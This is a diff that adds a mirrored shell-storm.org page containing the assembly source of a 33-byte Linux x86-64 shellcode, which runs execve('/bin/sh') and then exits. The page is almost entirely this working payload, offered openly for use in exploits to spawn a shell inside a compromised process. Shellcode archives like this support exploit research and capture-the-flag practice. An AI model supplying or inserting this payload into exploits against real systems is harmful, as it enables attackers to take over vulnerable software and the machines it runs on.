@@ -1,0 +1,44 @@
+<html>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-76.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+<head><title>Linux/x86-64 - execve(\\\&quot;/bin/sh\\\&quot;, [\\\&quot;/bin/sh\\\&quot;], NULL) - 33 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NLNHL50HG5"></script>
+<script src="http://shell-storm.org/assets/js/gtag.js"></script>
+</head>
+
+
+<pre>
+# [Linux/X86-64]
+# Dummy for shellcode:
+# execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)
+# hophet [at] gmail.com
+
+.text
+	.globl _start
+_start:
+	
+	xorq	%rdx, %rdx
+	movq	$0x68732f6e69622fff,%rbx
+	shr	$0x8, %rbx
+	push	%rbx
+	movq	%rsp,%rdi
+	xorq	%rax,%rax
+	pushq	%rax
+	pushq	%rdi
+	movq	%rsp,%rsi
+	mov	$0x3b,%al	# execve(3b)
+	syscall
+
+	pushq	$0x1
+	pop	%rdi
+	pushq	$0x3c		# exit(3c)
+	pop	%rax
+	syscall
+
+
+
+
+</pre>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-76.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+</html>
